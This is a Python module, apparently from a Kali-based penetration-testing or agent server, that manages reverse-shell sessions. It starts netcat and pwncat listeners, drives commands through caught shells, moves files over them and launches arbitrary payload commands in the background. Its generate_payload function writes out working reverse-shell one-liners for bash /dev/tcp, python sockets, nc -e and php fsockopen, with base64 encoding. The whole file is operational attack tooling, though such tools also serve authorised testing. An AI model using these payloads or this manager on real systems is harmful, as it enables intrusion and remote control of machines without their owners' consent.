#!/usr/bin/env python3
"""Reverse Shell Manager for Kali Server."""

import os
import time
import subprocess
import pty
import select
import signal
import threading
import queue
import uuid
import base64
import socket
import re
from typing import Dict, Any
from .config import logger, COMMAND_TIMEOUT


class ReverseShellManager:
    """Class to manage reverse shell sessions with interactive capabilities"""
    
    def __init__(self, port: int, session_id: str, listener_type: str = "pwncat"):
        self.port = port
        self.session_id = session_id
        self.listener_type = listener_type  # 'netcat' or 'pwncat'
        self.process = None
        self.master_fd = None
        self.slave_fd = None
        self.is_connected = False
        self.last_output = ""
        self.listener_thread = None
        self.output_buffer = []
        self.max_buffer_size = 1000
        # Trigger management attributes
        self.trigger_process = None
        self.trigger_thread = None
        
    def _is_port_in_use(self, port: int) -> bool:
        """Check if a port is already in use using multiple validation methods"""
        try:
            # Method 1: Check with netstat for any existing listeners
            netstat_result = subprocess.run(
                f"netstat -an | grep :{port} | grep LISTEN",
                shell=True,
                capture_output=True,
                text=True,
                timeout=3
            )
            
            if netstat_result.stdout.strip():
                logger.info(f"Port {port} is already in use (netstat check)")
                return True
            
            # Method 2: Try to bind to the port with socket
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as test_socket:
                    test_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    test_socket.bind(('0.0.0.0', port))
                    test_socket.listen(1)
                    logger.debug(f"Port {port} appears to be free (socket test passed)")
                    return False
            except (socket.error, OSError) as e:
                logger.info(f"Port {port} is already in use (socket bind failed: {e})")
                return True
                
        except Exception as e:
            logger.error(f"Error checking port {port}: {e}")
            # If we can't check, assume it's in use to be safe
            return True
        
        return False
        
    def start_listener(self) -> Dict[str, Any]:
        """Start a reverse shell listener using specified listener_type ('netcat' or 'pwncat')"""
        try:
            # Check if port is already in use before attempting to start
            if self._is_port_in_use(self.port):
                return {
                    "success": False,
                    "error": f"Port {self.port} is already in use. Please choose a different port.",
                    "session_id": self.session_id
                }
            
            logger.info(f"Starting reverse shell listener '{self.listener_type}' on port {self.port}")
            if self.listener_type == 'pwncat':
                # Try different pwncat variants, fallback to netcat if none work
                # Removed pwncat-cs due to Python version compatibility issues
                pwncat_commands = [
                    f"pwncat -l {self.port}",
                    f"pwncat --listen {self.port}"
                ]
                
                command = None
                pwncat_found = False
                
                # Test which pwncat is available
                for cmd in pwncat_commands:
                    test_program = cmd.split()[0]
                    try:
                        test_result = subprocess.run(f"which {test_program}", shell=True, capture_output=True, timeout=5)
                        if test_result.returncode == 0:
                            command = cmd
                            pwncat_found = True
                            logger.info(f"Found pwncat variant: {test_program}")
                            break
                    except:
                        continue
                
                if not pwncat_found:
                    logger.warning("No pwncat variant found, falling back to netcat")
                    command = f"nc -nvlp {self.port}"
                    self.listener_type = "netcat"  # Update type for consistency
                
                # Use PTY allocation for both pwncat and netcat fallback
                master_fd, slave_fd = pty.openpty()
                self.master_fd = master_fd
                self.slave_fd = slave_fd
                # Spawn listener attached to the slave side of PTY
                self.process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=slave_fd,
                    stdout=slave_fd,
                    stderr=slave_fd,
                    preexec_fn=os.setsid  # Create new process group
                )
                # Close slave FD in parent, communicate via master_fd
                os.close(slave_fd)
                # Don't assume immediate connection
                self.is_connected = False
            else:
                # Default to netcat with PTY allocation
                command = f"nc -nvlp {self.port}"
                # Allocate pseudo-terminal
                master_fd, slave_fd = pty.openpty()
                self.master_fd = master_fd
                self.slave_fd = slave_fd
                # Spawn netcat listener attached to the slave side of PTY
                self.process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=slave_fd,
                    stdout=slave_fd,
                    stderr=slave_fd,
                    preexec_fn=os.setsid  # Create new process group
                )
                # Close slave FD in parent, communicate via master_fd
                os.close(slave_fd)
                # Don't assume connection until actually established
                self.is_connected = False
            
            # Critical validation: Check if process started successfully
            time.sleep(0.5)  # Give process time to initialize
            if self.process.poll() is not None:
                # Process has already terminated, likely due to bind error
                try:
                    # Try to read any error output from the master_fd
                    ready, _, _ = select.select([self.master_fd], [], [], 0.1)
                    error_msg = "Process terminated immediately"
                    if ready:
                        try:
                            error_data = os.read(self.master_fd, 1024)
                            if error_data:
                                error_output = error_data.decode('utf-8', errors='ignore').strip()
                                if error_output:
                                    error_msg = f"Process error: {error_output}"
                        except:
                            pass
                    
                    # Clean up resources
                    try:
                        os.close(self.master_fd)
                    except:
                        pass
                    self.process = None
                    self.master_fd = None
                    
                    return {
                        "success": False,
                        "error": f"Failed to start {self.listener_type} listener on port {self.port}. {error_msg}. Port may already be in use.",
                        "session_id": self.session_id
                    }
                except Exception as validation_error:
                    logger.error(f"Error during process validation: {validation_error}")
                    return {
                        "success": False,
                        "error": f"Failed to start {self.listener_type} listener on port {self.port}. Process validation failed.",
                        "session_id": self.session_id
                    }
            
            # Process appears to be running, start monitoring thread
            self.listener_thread = threading.Thread(target=self._monitor_connection)
            self.listener_thread.daemon = True
            self.listener_thread.start()
            
            return {
                "success": True,
                "message": f"Reverse shell listener started using {self.listener_type} on port {self.port}",
                "session_id": self.session_id,
                "listener_command": command
            }
        except Exception as e:
            logger.error(f"Error starting reverse shell listener: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _monitor_connection(self):
        """Monitor the pwncat/netcat reverse shell connection with continuous monitoring"""
        timeout_count = 0
        max_timeout = 30  # Initial connection timeout
        connection_established = False
        
        logger.info(f"Starting connection monitoring for {self.listener_type} on port {self.port}")
        
        # Phase 1: Wait for initial connection
        while timeout_count < max_timeout and self.process and self.process.poll() is None:
            try:
                # Check for incoming connections on the port
                netstat_result = subprocess.run(
                    f"netstat -an | grep :{self.port} | grep ESTABLISHED",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                
                if netstat_result.stdout.strip():
                    self.is_connected = True
                    connection_established = True
                    logger.info(f"{self.listener_type.capitalize()} reverse shell connection established on port {self.port}")
                    break
                
                time.sleep(1)
                timeout_count += 1
                
            except Exception as e:
                logger.error(f"Error monitoring connection: {str(e)}")
                break
        
        if not connection_established:
            logger.warning(f"No {self.listener_type} connection established within {max_timeout} seconds")
            return
        
        # Phase 2: Continuous monitoring of established connection
        logger.info(f"Starting continuous monitoring of established connection on port {self.port}")
        while self.process and self.process.poll() is None:
            try:
                # Check if connection is still active
                netstat_result = subprocess.run(
                    f"netstat -an | grep :{self.port} | grep ESTABLISHED",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                
                current_connected = bool(netstat_result.stdout.strip())
                
                # Update connection status if changed
                if current_connected != self.is_connected:
                    self.is_connected = current_connected
                    if current_connected:
                        logger.info(f"Connection re-established on port {self.port}")
                    else:
                        logger.info(f"Connection lost on port {self.port}")
                
                # Check every 5 seconds during continuous monitoring
                time.sleep(5)
                
            except Exception as e:
                logger.error(f"Error in continuous monitoring: {str(e)}")
                break
        
        # Connection monitoring ended (process died or error)
        self.is_connected = False
        logger.info(f"Connection monitoring ended for port {self.port}")
    
    def _drain_shell_buffer(self):
        """Drain any residual output from the shell buffer to prevent contamination"""
        if not (self.process and self.process.stdout):
            return
            
        try:
            # Quick drain of any pending output
            drain_count = 0
            while drain_count < 20:  # Limit to prevent infinite loop
                ready, _, _ = select.select([self.process.stdout], [], [], 0.05)
                if not ready:
                    break
                try:
                    line = self.process.stdout.readline()
                    if isinstance(line, bytes):
                        line = line.decode('utf-8', errors='ignore')
                    if not line:
                        break
                    drain_count += 1
                except:
                    break
        except Exception as e:
            pass

    def send_command(self, command: str, timeout: int = 60) -> Dict[str, Any]:
        """Send a command to the reverse shell with simple marker approach"""
        if not self.is_connected:
            return {
                "success": False,
                "error": "No active reverse shell connection",
                "output": ""
            }
        
        try:
            # Always use PTY approach since both pwncat and netcat now use PTY
            use_pty = True
            logger.info(f"Using PTY approach for {self.listener_type} listener")
                
            if use_pty:
                logger.info(f"Executing command via PTY: {command}")
                # Generate unique markers
                start_marker_id = str(uuid.uuid4())[:8]
                end_marker_id = str(uuid.uuid4())[:8]
                start_marker = f"START_{start_marker_id}"
                end_marker = f"END_{end_marker_id}"
                
                # Special handling for base64 commands that output on single line
                is_base64_command = "base64" in command.lower()
                
                # Send start marker, command, and end marker via PTY
                os.write(self.master_fd, (f"echo '{start_marker}'\r\n").encode())
                time.sleep(0.3 if is_base64_command else 0.2)  # Extra time for base64
                os.write(self.master_fd, (command + "\r\n").encode())
                time.sleep(0.5 if is_base64_command else 0.2)  # More time for base64 output
                os.write(self.master_fd, (f"echo '{end_marker}'\r\n").encode())
                
                # Collect output between markers with improved buffering
                start_time = time.time()
                all_lines = []
                buffer = b""
                capture_mode = False
                end_marker_found = False
                
                # For base64 commands, we need to handle continuous output without line breaks
                if is_base64_command:
                    captured_data = b""
                    raw_buffer = b""  # Keep all data for debugging
                    
                    while time.time() - start_time < timeout and not end_marker_found:
                        try:
                            rlist, _, _ = select.select([self.master_fd], [], [], 2.0)  # Longer select timeout
                            if self.master_fd in rlist:
                                data = os.read(self.master_fd, 8192)  # Larger buffer for base64
                                if not data:
                                    time.sleep(0.1)
                                    continue
                                    
                                raw_buffer += data
                                captured_data += data
                                
                                # Convert to text for marker detection
                                text_buffer = raw_buffer.decode(errors='ignore')
                                
                                # Look for start marker
                                if start_marker in text_buffer and not capture_mode:
                                    capture_mode = True
                                    # Find position after start marker and newline
                                    start_pos = text_buffer.find(start_marker)
                                    # Look for the first newline after the start marker
                                    newline_pos = text_buffer.find('\n', start_pos)
                                    if newline_pos != -1:
                                        # Reset captured_data to start after the marker line
                                        remaining_text = text_buffer[newline_pos + 1:]
                                        captured_data = remaining_text.encode()
                                    continue
                                
                                # Look for end marker
                                if end_marker in text_buffer and capture_mode:
                                    # Extract content before end marker - use full text_buffer instead of partial content
                                    end_pos = text_buffer.find(end_marker)
                                    # Find start position after start marker line
                                    start_pos = text_buffer.find(start_marker)
                                    start_line_end = text_buffer.find('\n', start_pos)
                                    if start_line_end != -1:
                                        # Extract everything between start marker line and end marker
                                        clean_content = text_buffer[start_line_end + 1:end_pos]
                                    else:
                                        clean_content = text_buffer[start_pos:end_pos]
                                    
                                    end_marker_found = True
                                    
                                    # Process the base64 content more carefully
                                    # Extract base64 content from the entire clean_content using regex
                                    
                                    # Method 1: Look for base64 sequences that may be concatenated with text
                                    # The issue is that base64 content is concatenated like: "UmVhbCBkb3dubG9hZCB0ZXN0IDE3NTQxNDk3NTEKecho"
                                    
                                    # First try: Look for base64 followed by 'echo' (the most common case)
                                    echo_concat_pattern = r'([A-Za-z0-9+/]{16,}={0,2})echo'
                                    echo_matches = re.findall(echo_concat_pattern, clean_content)
                                    
                                    for match in echo_matches:
                                        # Ensure proper padding
                                        padded_match = match
                                        while len(padded_match) % 4 != 0:
                                            padded_match += '='
                                        
                                        # Test if it's valid base64
                                        try:
                                            test_decode = base64.b64decode(padded_match)
                                            if len(test_decode) > 3:  # Must decode to something meaningful
                                                all_lines.append(padded_match)
                                        except Exception:
                                            pass
                                    
                                    # Second try: Look for standalone base64 sequences (original approach)
                                    if not all_lines:
                                        base64_pattern = r'([A-Za-z0-9+/]{20,}={0,2})'  # At least 20 chars, optional padding
                                        base64_matches = re.findall(base64_pattern, clean_content)
                                        
                                        for match in base64_matches:
                                            # Validate base64 format and length
                                            if len(match) >= 8:
                                                # Clean any trailing non-base64 characters
                                                clean_match = re.sub(r'[^A-Za-z0-9+/=].*$', '', match)
                                                
                                                # Ensure proper padding
                                                while len(clean_match) % 4 != 0:
                                                    clean_match += '='
                                                
                                                # Test if it's valid base64 by trying to decode
                                                try:
                                                    test_decode = base64.b64decode(clean_match)
                                                    if len(test_decode) > 5:  # Must decode to something meaningful
                                                        all_lines.append(clean_match)
                                                except Exception:
                                                    pass
                                    
                                    # Method 2: If no matches found, try line-by-line with better filtering
                                    if not all_lines:
                                        lines = clean_content.strip().split('\n')
                                        
                                        for line in lines:
                                            line = line.strip()
                                            
                                            # Skip obvious non-content lines
                                            if (not line or 
                                                line == command or
                                                line.endswith('$') or
                                                line.startswith('echo ') or
                                                'START_' in line or
                                                line.startswith(command.split()[0])):
                                                continue
                                            
                                            # Method 2a: Extract base64 from lines that contain 'echo ' (with space before echo)
                                            if 'echo ' in line:
                                                # Split on 'echo ' and take everything before it
                                                base64_part = line.split('echo ')[0].strip()
                                                if base64_part and len(base64_part) > 8:
                                                    try:
                                                        # Ensure proper padding
                                                        while len(base64_part) % 4 != 0:
                                                            base64_part += '='
                                                        test_decode = base64.b64decode(base64_part)
                                                        if len(test_decode) > 5:
                                                            all_lines.append(base64_part)
                                                            continue
                                                    except Exception:
                                                        pass
                                            
                                            # Method 2b: Handle concatenated case (base64Kecho without space)
                                            echo_pos = line.find('echo')
                                            if echo_pos > 0:  # Echo found, but not at start
                                                base64_part = line[:echo_pos].strip()
                                                if base64_part and len(base64_part) > 8:
                                                    try:
                                                        # Ensure proper padding
                                                        while len(base64_part) % 4 != 0:
                                                            base64_part += '='
                                                        test_decode = base64.b64decode(base64_part)
                                                        if len(test_decode) > 5:
                                                            all_lines.append(base64_part)
                                                            continue
                                                    except Exception:
                                                        pass
                                            
                                            # Method 2c: Check if the entire line is pure base64
                                            if re.match(r'^[A-Za-z0-9+/=]+$', line) and len(line) > 8:
                                                try:
                                                    # Ensure proper padding
                                                    padded_line = line
                                                    while len(padded_line) % 4 != 0:
                                                        padded_line += '='
                                                    test_decode = base64.b64decode(padded_line)
                                                    if len(test_decode) > 5:
                                                        all_lines.append(padded_line)
                                                except Exception:
                                                    pass
                                    
                                    break
                            else:
                                # No immediate data available, but keep waiting
                                time.sleep(0.2)
                        except Exception as e:
                            logger.error(f"Error reading PTY data for base64: {e}")
                            break
                else:
                    # Regular line-by-line processing for non-base64 commands
                    while time.time() - start_time < timeout and not end_marker_found:
                        try:
                            rlist, _, _ = select.select([self.master_fd], [], [], 1.0)
                            if self.master_fd in rlist:
                                data = os.read(self.master_fd, 4096)  # Larger buffer
                                if not data:
                                    break
                                buffer += data
                                
                                # Process complete lines
                                while b"\n" in buffer:
                                    line, buffer = buffer.split(b"\n", 1)
                                    text = line.decode(errors='ignore').strip()
                                    
                                    # Skip empty lines and command echoes
                                    if not text or text == command:
                                        continue
                                    
                                    # Start capturing after start marker
                                    if start_marker in text:
                                        capture_mode = True
                                        continue
                                    
                                    # Stop capturing at end marker
                                    if end_marker in text:
                                        end_marker_found = True
                                        break
                                    
                                    # Only capture lines between markers
                                    if capture_mode and text:
                                        # Skip the echo commands themselves
                                        if not (text.startswith("echo '") and ("START_" in text or "END_" in text)):
                                            all_lines.append(text)
                                            logger.info(f"Captured via PTY: '{text}'")
                            else:
                                # No data available, short sleep
                                time.sleep(0.1)
                        except Exception as e:
                            logger.error(f"Error reading PTY data: {e}")
                            break
                
                # Return results
                output = '\n'.join(all_lines)
                return {
                    "success": True,
                    "output": output,
                    "command": command,
                    "session_id": self.session_id,
                    "lines_captured": len(all_lines),
                    "execution_time": time.time() - start_time,
                    "debug_info": {
                        "start_marker": start_marker, 
                        "end_marker": end_marker,
                        "end_marker_found": end_marker_found,
                        "capture_mode_activated": capture_mode
                    }
                }
            
            # Use STDIN/STDOUT approach for both netcat and pwncat
            if self.process and self.process.stdin:
                logger.info(f"Executing command via STDIN/STDOUT: {command}")
                
                # Check if process is still alive
                if self.process.poll() is not None:
                    return {
                        "success": False,
                        "error": "Reverse shell process has terminated",
                        "output": ""
                    }
                
                # Use dual marker approach for better isolation
                start_marker_id = str(uuid.uuid4())[:8]
                end_marker_id = str(uuid.uuid4())[:8]
                start_marker = f"START_{start_marker_id}"
                end_marker = f"END_{end_marker_id}"
                
                try:
                    # Send start marker, command, and end marker
                    self.process.stdin.write(f"echo '{start_marker}'\n".encode())
                    self.process.stdin.flush()
                    time.sleep(0.1)
                    self.process.stdin.write(f"{command}\n".encode())
                    self.process.stdin.flush()
                    time.sleep(0.1)
                    self.process.stdin.write(f"echo '{end_marker}'\n".encode())
                    self.process.stdin.flush()
                except BrokenPipeError:
                    return {
                        "success": False,
                        "error": "Broken pipe - reverse shell disconnected",
                        "output": ""
                    }
                
                logger.info(f"Command sent with markers: {start_marker} -> {end_marker}")
                
                # Collect output between markers
                output_lines = []
                all_lines = []
                start_time = time.time()
                max_wait_time = timeout
                capture_mode = False
                
                while time.time() - start_time < max_wait_time:
                    try:
                        def read_line_with_timeout(q):
                            try:
                                line = self.process.stdout.readline()
                                if isinstance(line, bytes):
                                    line = line.decode('utf-8', errors='ignore')
                                q.put(line)
                            except:
                                q.put(None)
                        
                        q = queue.Queue()
                        thread = threading.Thread(target=read_line_with_timeout, args=(q,))
                        thread.daemon = True
                        thread.start()
                        thread.join(timeout=3.0)  # 3 seconds per line
                        
                        try:
                            line = q.get_nowait()
                            if line:
                                clean_line = line.strip()
                                all_lines.append(clean_line)
                                
                                # Start capturing after start marker
                                if start_marker in clean_line:
                                    capture_mode = True
                                    continue
                                
                                # Stop capturing at end marker
                                if end_marker in clean_line:
                                    break
                                
                                # Only capture meaningful lines between markers
                                if capture_mode and clean_line and clean_line != command:
                                    # Skip echo commands for markers
                                    if not (clean_line.startswith("echo '") and ("START_" in clean_line or "END_" in clean_line)):
                                        output_lines.append(clean_line)
                                        logger.info(f"Captured output: '{clean_line}'")
                            
                            elif line is None:  # End of stream
                                break
                                
                        except queue.Empty:
                            # No output available, continue waiting
                            time.sleep(0.2)
                        
                    except Exception as e:
                        logger.error(f"Error reading output: {e}")
                        break
                
                # Process the captured output
                result = '\n'.join(output_lines) if output_lines else "Command executed (no output captured)"
                
                logger.info(f"Command completed, captured {len(output_lines)} output lines")
                
                return {
                    "success": True,
                    "output": result,
                    "command": command,
                    "session_id": self.session_id,
                    "lines_captured": len(output_lines),
                    "execution_time": time.time() - start_time,
                    "debug_info": {
                        "start_marker": start_marker,
                        "end_marker": end_marker,
                        "total_lines": len(all_lines),
                        "capture_mode_activated": capture_mode
                    }
                }
                
            else:
                return {
                    "success": False,
                    "error": "No active netcat process",
                    "output": ""
                }
            
        except Exception as e:
            logger.error(f"Error executing command: {e}")
            return {
                "success": False,
                "error": str(e),
                "output": ""
            }
            
        except Exception as e:
            logger.error(f"Error executing command: {e}")
            return {
                "success": False,
                "error": str(e),
                "output": ""
            }
    
    def _is_shell_noise(self, line):
        """Check if a line is shell noise that should be filtered out"""
        if not line.strip():
            return True
            
        noise_patterns = [
            "bash: cannot set terminal process group",
            "Inappropriate ioctl for device", 
            "bash: no job control in this shell",
            "james@knife:",
            "listening on [any]",  # netcat listener noise
            "connect to",  # netcat connection noise
            "Connection from"  # netcat connection established
        ]
        
        # Check for complete shell prompt patterns (not just $)
        if line.endswith("$ ") or line.endswith("$"):
            return True
            
        for pattern in noise_patterns:
            if pattern in line:
                return True
                
        return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get the status of the reverse shell session"""
        # Check if process is actually alive
        process_alive = self.process and self.process.poll() is None
        
        # If process is dead, connection should be false
        if not process_alive:
            self.is_connected = False
        
        # Double-check connection status with netstat if process is alive
        actual_connection = False
        if process_alive:
            try:
                netstat_result = subprocess.run(
                    f"netstat -an | grep :{self.port} | grep ESTABLISHED",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                actual_connection = bool(netstat_result.stdout.strip())
                # Update internal state based on actual network status
                self.is_connected = actual_connection
            except Exception as e:
                logger.debug(f"Error checking connection status: {e}")
                # If we can't check, assume disconnected for safety
                self.is_connected = False
        
        return {
            "session_id": self.session_id,
            "port": self.port,
            "is_connected": self.is_connected,
            "process_alive": process_alive,
            "listener_active": self.listener_thread and self.listener_thread.is_alive(),
            "actual_network_connection": actual_connection
        }
    
    def stop(self):
        """Stop the reverse shell listener"""
        try:
            if self.process:
                logger.info(f"Stopping reverse shell listener process (PID: {self.process.pid})")
                
                # Try different stopping approaches based on platform and process state
                try:
                    # First try gentle termination
                    self.process.terminate()
                    
                    # Wait a bit for graceful shutdown
                    try:
                        self.process.wait(timeout=3)
                        logger.info("Process terminated gracefully")
                    except subprocess.TimeoutExpired:
                        # If it doesn't terminate gracefully, force kill
                        logger.warning("Process didn't terminate gracefully, forcing kill")
                        self.process.kill()
                        self.process.wait(timeout=2)
                        
                except (ProcessLookupError, OSError) as e:
                    # Process might already be dead
                    logger.info(f"Process already terminated: {e}")
                    
                except Exception as e:
                    logger.error(f"Error during process termination: {e}")
                    # Last resort - try to kill by PID directly
                    try:
                        os.kill(self.process.pid, signal.SIGTERM)
                        time.sleep(1)
                        os.kill(self.process.pid, signal.SIGKILL)
                    except:
                        pass
                
                self.process = None
            
            # IMPORTANT: Close PTY file descriptor to free port resources
            if self.master_fd is not None:
                try:
                    os.close(self.master_fd)
                    logger.info(f"Closed PTY master fd for port {self.port}")
                except Exception as e:
                    logger.warning(f"Error closing master_fd: {e}")
                finally:
                    self.master_fd = None
                
        except Exception as e:
            logger.error(f"Error stopping reverse shell: {str(e)}")
        
        # Stop the trigger process if running
        try:
            if hasattr(self, "trigger_process") and self.trigger_process:
                try:
                    logger.info(f"Stopping trigger process (PID: {self.trigger_process.pid})")
                    self.trigger_process.terminate()
                    try:
                        self.trigger_process.wait(timeout=3)
                        logger.info("Trigger process terminated gracefully")
                    except subprocess.TimeoutExpired:
                        logger.warning("Trigger process didn't terminate gracefully, forcing kill")
                        self.trigger_process.kill()
                        self.trigger_process.wait(timeout=2)
                except (ProcessLookupError, OSError) as e:
                    logger.info(f"Trigger process already terminated: {e}")
                except Exception as e:
                    logger.error(f"Error stopping trigger process: {e}")
                finally:
                    self.trigger_process = None

            # Note: trigger_thread will be cleaned up automatically as it's a daemon thread
            if hasattr(self, "trigger_thread") and self.trigger_thread and self.trigger_thread.is_alive():
                logger.info("Trigger thread is running and will be cleaned up automatically (daemon thread)")
                
        except Exception as e:
            logger.error(f"Error during trigger cleanup: {e}")
        
        # Always reset connection state regardless of process cleanup success
        self.is_connected = False
        logger.info("Reverse shell session stopped")
        
        # Additional cleanup: Force kill any remaining processes on this port
        try:
            logger.info(f"Force cleanup of port {self.port}")
            # Use lsof to find any remaining processes on this port
            lsof_result = subprocess.run(
                f"lsof -ti:{self.port}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if lsof_result.stdout.strip():
                pids = [int(pid.strip()) for pid in lsof_result.stdout.strip().split('\n') if pid.strip().isdigit()]
                for pid in pids:
                    try:
                        os.kill(pid, signal.SIGKILL)
                        logger.info(f"Force killed remaining process {pid} on port {self.port}")
                    except ProcessLookupError:
                        pass  # Process already dead
                    except Exception as e:
                        logger.warning(f"Could not kill process {pid}: {e}")
        except Exception as e:
            logger.debug(f"Port cleanup check failed: {e}")
            
        # Give system time to free the port
        time.sleep(1)
    
    def upload_content(self, content: str, remote_file: str, encoding: str = "base64") -> Dict[str, Any]:
        """Upload content with checksum verification using FileTransferManager."""
        try:
            from utils.transfer_manager import transfer_manager
            return transfer_manager.upload_via_reverse_shell_with_verification(
                shell_manager=self,
                content=content,
                remote_file=remote_file,
                encoding=encoding
            )
        except Exception as e:
            logger.error(f"Error in reverse shell upload: {str(e)}")
            return {"error": str(e), "success": False}

    def download_content(self, remote_file: str, encoding: str = "base64") -> Dict[str, Any]:
        """Download content with checksum verification using FileTransferManager."""
        try:
            from utils.transfer_manager import transfer_manager
            return transfer_manager.download_via_reverse_shell_with_verification(
                shell_manager=self,
                remote_file=remote_file,
                encoding=encoding
            )
        except Exception as e:
            logger.error(f"Error in reverse shell download: {str(e)}")
            return {"error": str(e), "success": False}

    def send_payload(self, payload_command: str, timeout: int = 10, wait_seconds: int = 5) -> Dict[str, Any]:
        """
        Send a payload command (e.g., reverse shell payload) in a non-blocking way.
        The process is started in a background thread and associated with the session.
        Waits a few seconds after execution and returns session status.
        
        Args:
            payload_command (str): The payload command to execute
            timeout (int): Timeout for the command execution
            wait_seconds (int): Seconds to wait before checking session status
            
        Returns:
            Dict[str, Any]: Result dictionary with success status, message, and session status
        """
        def _run_payload():
            try:
                # Store the process so it can be terminated later
                self.trigger_process = subprocess.Popen(
                    payload_command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    preexec_fn=os.setsid
                )
                try:
                    stdout, stderr = self.trigger_process.communicate(timeout=timeout)
                    logger.info(f"Payload command completed. Exit code: {self.trigger_process.returncode}")
                    if stdout:
                        logger.debug(f"Payload stdout: {stdout.decode()}")
                    if stderr:
                        logger.debug(f"Payload stderr: {stderr.decode()}")
                except subprocess.TimeoutExpired:
                    logger.warning(f"Payload command timed out after {timeout} seconds")
                    self.trigger_process.kill()
                    try:
                        stdout, stderr = self.trigger_process.communicate(timeout=5)
                    except subprocess.TimeoutExpired:
                        pass
            except Exception as e:
                logger.error(f"Payload execution failed: {e}")
            finally:
                # Clear the process reference when done
                if hasattr(self, 'trigger_process'):
                    self.trigger_process = None

        # Start the payload in a background thread
        self.trigger_thread = threading.Thread(target=_run_payload, daemon=True)
        self.trigger_thread.start()

        logger.info(f"Payload executed: {payload_command} (non-blocking)")
        
        # Wait a few seconds before checking session status
        time.sleep(wait_seconds)
        session_status = self.get_status()
        
        return {
            "success": True,
            "message": "Payload command executed in background.",
            "payload_command": payload_command,
            "session_id": self.session_id,
            "session_status": session_status,
            "wait_time_seconds": wait_seconds
        }

    @staticmethod
    def generate_payload(local_ip: str = "127.0.0.1", local_port: int = 4444, 
                        payload_type: str = "bash", encoding: str = "base64") -> Dict[str, Any]:
        """Generate reverse shell payloads"""
        try:
            payloads = {}
            
            if payload_type == "bash":
                bash_payload = f"bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1"
                payloads["bash"] = bash_payload
                if encoding == "base64":
                    payloads["bash_base64"] = base64.b64encode(bash_payload.encode()).decode()
                    
            elif payload_type == "python":
                python_payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local_ip}\",{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                payloads["python"] = python_payload
                if encoding == "base64":
                    payloads["python_base64"] = base64.b64encode(python_payload.encode()).decode()
                    
            elif payload_type == "nc":
                nc_payload = f"nc -e /bin/sh {local_ip} {local_port}"
                payloads["nc"] = nc_payload
                if encoding == "base64":
                    payloads["nc_base64"] = base64.b64encode(nc_payload.encode()).decode()
                    
            elif payload_type == "php":
                php_payload = f"php -r '$sock=fsockopen(\"{local_ip}\",{local_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                payloads["php"] = php_payload
                if encoding == "base64":
                    payloads["php_base64"] = base64.b64encode(php_payload.encode()).decode()
            
            return {
                "success": True,
                "payloads": payloads,
                "local_ip": local_ip,
                "local_port": local_port,
                "payload_type": payload_type,
                "encoding": encoding
            }
        except Exception as e:
            logger.error(f"Error generating reverse shell payload: {str(e)}")
            return {"success": False, "error": f"Failed to generate payload: {str(e)}"}
